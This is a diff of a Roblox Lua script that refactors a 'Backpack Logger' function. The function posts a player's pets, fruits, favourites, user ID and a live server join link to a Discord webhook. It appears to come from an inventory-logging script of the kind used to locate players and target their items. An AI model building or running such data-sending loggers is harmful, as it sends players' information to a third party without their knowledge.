@@ -121,36 +121,23 @@ end
 local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
     local userId = LocalPlayer.UserId
     local username = LocalPlayer.Name
-    local allFields = {}
+    local fields = {}
 
-    -- P-E-T-S
+    -- PETS
     if #pets > 0 then
-        table.insert(allFields, { name = "Pets", value = " ", inline = false })
+        table.insert(fields, { name = "Pets", value = " ", inline = false })
         local petNames, petAges, petWeights = parsePets(pets)
-        table.insert(allFields, {
-            name = "🐾 Pets",
-            value = "```\n" .. table.concat(petNames, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "🧩 Age",
-            value = "```\n" .. table.concat(petAges, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "⚖️ Weight",
-            value = "```\n" .. table.concat(petWeights, "\n") .. "\n```",
-            inline = true
-        })
+        table.insert(fields, { name = "🐾 Pets", value = "```\n" .. table.concat(petNames, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "🧩 Age", value = "```\n" .. table.concat(petAges, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(petWeights, "\n") .. "\n```", inline = true })
     end
 
-    -- F-R-U-I-T-S
+    -- FRUITS
     if #fruits > 0 then
-        table.insert(allFields, { name = "Fruits", value = " ", inline = false })
-
+        table.insert(fields, { name = "Fruits", value = " ", inline = false })
         sortFruitsAlphabetically(fruits)
-        local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
 
+        local fruitNames, fruitMutations, fruitWeights = {}, {}, {}
         for _, tool in ipairs(fruits) do
             local baseName, modStr, weight = parseToolFruitInfo(tool.Name)
             table.insert(fruitNames, baseName)
@@ -158,78 +145,62 @@ local function sendWebhook(pets, fruits, favNames, favMods, favWeights)
             table.insert(fruitWeights, "[" .. weight .. "]")
         end
 
-        table.insert(allFields, {
-            name = "🍑 Fruits",
-            value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "🧩 Mutation",
-            value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "⚖️ Weight",
-            value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```",
-            inline = true
-        })
+        table.insert(fields, { name = "🍑 Fruits", value = "```\n" .. table.concat(fruitNames, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "🧩 Mutation", value = "```\n" .. table.concat(fruitMutations, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(fruitWeights, "\n") .. "\n```", inline = true })
     end
 
-    -- F-A-V-O-R-I-T-E-S
+    -- FAVORITES
     if #favNames > 0 then
-        table.insert(allFields, { name = "Favorites", value = " ", inline = false })
-        table.insert(allFields, {
-            name = "⭐ Favorites",
-            value = "```\n" .. table.concat(favNames, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "🧩 Mutation / Pet Age",
-            value = "```\n" .. table.concat(favMods, "\n") .. "\n```",
-            inline = true
-        })
-        table.insert(allFields, {
-            name = "⚖️ Weight",
-            value = "```\n" .. table.concat(favWeights, "\n") .. "\n```",
-            inline = true
-        })
+        table.insert(fields, { name = "Favorites", value = " ", inline = false })
+        table.insert(fields, { name = "⭐ Favorites", value = "```\n" .. table.concat(favNames, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "🧩 Mutation / Pet Age", value = "```\n" .. table.concat(favMods, "\n") .. "\n```", inline = true })
+        table.insert(fields, { name = "⚖️ Weight", value = "```\n" .. table.concat(favWeights, "\n") .. "\n```", inline = true })
     end
 
     local joinLink = string.format("__**[✅ Join Server](https://www.roblox.com/games/%s?jobId=%s)**__", game.PlaceId, game.JobId)
 
-    -- Split fields into multiple embeds if needed
-    local embeds = {}
-    for i = 1, #allFields, 25 do
-        local embedFields = {}
-        for j = i, math.min(i + 24, #allFields) do
-            table.insert(embedFields, allFields[j])
+    -- SPLIT FIELDS into 25-per-embed chunks
+    local function chunkify(tbl, size)
+        local chunks = {}
+        for i = 1, #tbl, size do
+            table.insert(chunks, { unpack(tbl, i, math.min(i + size - 1, #tbl)) })
         end
-        table.insert(embeds, {
-            title = username .. "'s Backpack Inventory",
-            url = "https://www.roblox.com/users/" .. userId .. "/profile",
-            color = 0x00BFFF,
-            description = joinLink,
-            fields = embedFields,
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        })
+        return chunks
     end
 
-    local payload = {
-        username = "Backpack Logger",
-        embeds = embeds
-    }
+    local chunks = chunkify(fields, 25)
+    for i, chunk in ipairs(chunks) do
+        local embed = {
+            title = username .. "'s Backpack Inventory" .. (i > 1 and (" (Part " .. i .. ")") or ""),
+            url = "https://www.roblox.com/users/" .. userId .. "/profile",
+            color = 0x00BFFF,
+            fields = chunk,
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+        if i == 1 then
+            embed.description = joinLink
+        end
 
-    local response = safeRequest({
-        Url = WEBHOOK_URL,
-        Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
-        Body = HttpService:JSONEncode(payload)
-    })
+        local payload = {
+            username = "Backpack Logger",
+            embeds = { embed }
+        }
 
-    if response.StatusCode == 204 then
-        warn("✅ Sent to Discord.")
-    else
-        warn("❌ Failed:", response.StatusCode, response.StatusMessage)
+        local response = safeRequest({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload)
+        })
+
+        if response.StatusCode == 204 then
+            warn("✅ Sent embed part " .. i)
+        else
+            warn("❌ Failed part " .. i .. ":", response.StatusCode, response.StatusMessage)
+        end
+
+        task.wait(1.2) -- Slight delay to avoid rate limits
     end
 end
 
